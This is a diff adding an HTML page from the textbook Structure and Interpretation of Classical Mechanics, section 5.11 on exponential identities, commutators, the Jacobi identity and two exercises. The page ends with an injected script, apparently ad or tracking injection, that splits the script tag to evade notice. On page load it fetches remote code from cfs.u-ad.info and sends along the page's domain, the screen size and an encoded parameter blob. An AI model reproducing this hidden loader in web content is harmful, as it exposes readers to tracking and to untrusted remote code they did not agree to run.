@@ -1,0 +1,125 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-67.html">previous</a></span><span>, <a href="book-Z-H-69.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_5.11"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_5.11">5.11&nbsp;&nbsp;Exponential Identities</a></h2>
+<p><a name="%_idx_2916"></a><a name="%_idx_2918"></a><a name="%_idx_2920"></a><a name="%_idx_2922"></a>
+<a name="%_idx_2924"></a><a name="%_idx_2926"></a>The composition of Lie transforms can be written as products of
+exponentials of Lie derivative operators.  In general, Lie derivative
+operators do not commute.  
+If <em>A</em> and <em>B</em> are non-commuting operators, then the exponents do not
+combine in the usual way:
+<a name="EQUATION_5.462"></a></p>
+<div align=left><img src="chap5-Z-G-430.gif" border="0"></div>
+<p>
+So it will be helpful to recall some
+results about exponentials of non-commuting operators.</p>
+<p>
+<a name="%_idx_2928"></a>We introduce the commutator
+<a name="EQUATION_5.463"></a></p>
+<div align=left><img src="chap5-Z-G-431.gif" border="0"></div>
+<p>
+The commutator is bilinear and satisfies the <a name="%_idx_2930"></a><a name="%_idx_2932"></a>Jacobi identity
+<a name="EQUATION_5.464"></a></p>
+<div align=left><img src="chap5-Z-G-432.gif" border="0"></div>
+<p>
+which is true for all <em>A</em>, <em>B</em>, and <em>C</em>.</p>
+<p>
+We introduce a notation <img src="chap1-Z-G-D-43.gif" border="0"><sub><em>A</em></sub> for the commutator with respect to
+the operator <em>A</em>:
+<a name="EQUATION_5.465"></a></p>
+<div align=left><img src="chap5-Z-G-433.gif" border="0"></div>
+<p>
+In terms of <img src="chap1-Z-G-D-43.gif" border="0"> the Jacobi identity is
+<a name="EQUATION_5.466"></a></p>
+<div align=left><img src="chap5-Z-G-434.gif" border="0"></div>
+<p></p>
+<p>
+An important identity is
+<a name="EQUATION_5.467"></a></p>
+<div align=left><img src="chap5-Z-G-435.gif" border="0"></div>
+<p>
+We can check this term by term.</p>
+<p>
+We see that
+<a name="EQUATION_5.468"></a></p>
+<div align=left><img src="chap5-Z-G-436.gif" border="0"></div>
+<p>
+using <em>e</em><sup><tt>-</tt><em>C</em></sup> <em>e</em><sup><em>C</em></sup>  =  <em>I</em>, the identity operator.
+Using the same trick, we find
+<a name="EQUATION_5.469"></a></p>
+<div align=left><img src="chap5-Z-G-437.gif" border="0"></div>
+<p>
+More generally, if <em>f</em> can be represented as a power series then
+<a name="EQUATION_5.470"></a></p>
+<div align=left><img src="chap5-Z-G-438.gif" border="0"></div>
+<p>
+For instance, applying this to the exponential function yields
+<a name="EQUATION_5.471"></a></p>
+<div align=left><img src="chap5-Z-G-439.gif" border="0"></div>
+<p>
+Using equation&nbsp;(<a href="#EQUATION_5.467">5.467</a>), we can rewrite this as
+<a name="EQUATION_5.472"></a></p>
+<div align=left><img src="chap5-Z-G-440.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.30"></a>
+<b>Exercise 5.30.</b>&nbsp;&nbsp;<strong>Commutators of Lie derivatives</strong><br>
+<a name="%_idx_2934"></a><a name="%_idx_2936"></a><a name="%_idx_2938"></a><a name="%_idx_2940"></a>
+<br><strong>a</strong>.&nbsp;&nbsp;Let <em>W</em> and <em>W</em>' be two phase-space state functions.  
+Use the Poisson-bracket Jacobi identity&nbsp;(<a href="book-Z-H-38.html#EQUATION_3.92">3.92</a>)
+to show
+<a name="EQUATION_5.473"></a></p>
+<div align=left><img src="chap5-Z-G-441.gif" border="0"></div>
+<p></p>
+<p>
+<a name="%_idx_2942"></a><a name="%_idx_2944"></a><strong>b</strong>.&nbsp;&nbsp;Consider the phase-space state functions that give the
+components of the angular momentum in terms of rectangular canonical
+coordinates
+</p>
+<div align=left><img src="chap5-Z-G-442.gif" border="0"></div>
+<p>
+Show 
+<a name="EQUATION_5.474"></a></p>
+<div align=left><img src="chap5-Z-G-443.gif" border="0"></div>
+<p></p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;Relate the Jacobi identity for operators to the 
+Poisson-bracket Jacobi identity.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.31"></a>
+<b>Exercise 5.31.</b>&nbsp;&nbsp;<strong>Baker-Campbell-Hausdorff</strong><br>
+<a name="%_idx_2946"></a>Derive the rule for combining exponentials of non-commuting operators:
+<a name="EQUATION_5.475"></a></p>
+<div align=left><img src="chap5-Z-G-444.gif" border="0"></div>
+<p>
+</p>
+
+<p></p>
+<p>
+
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-67.html">previous</a></span><span>, <a href="book-Z-H-69.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0l78vkOV1R80NBFQm6PpH5YGLNPBbdxHSHStE93wvSKpX91gTJFb%2bg5bYQUV1u5rl4m%2b%2bFo8YIoeadS4tyaRaEpqcZRThpqqfA8SgMlVDQuFelLkU%2fPFT2PLqjGOocZvEr3z3rt6XOL8RhDfpIaNeSbYRnZghSPFWrS5og39q6RjQzslaxVwSHnGd3rpKNmfiaNyYSHzDoaflGnnFxiTbC8DdcpY5dQIDKNN0c2QQHtEyhjOlYd9oBlXMW2AWLDaX0SeZyRBzKI2K4AesjhRuqNx1Pv61Yg7Wq2orZ14TYyl7zSdVR0fuGKGCR2WS0BrygtZFi%2bJ5kD0CIZYiOMhI0ca4CJZhQ7bXwjkU%2beiAkovNcTvl317MJrag0YWMQcmcQsBS4bi5vxNFdcBj9XdZ5BQiEIBq0OVcUTanSQYeJP19gdd4I3iDVKkThBInIIMxCDKwJCYrXbN%2fXK%2b4VO9fk");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
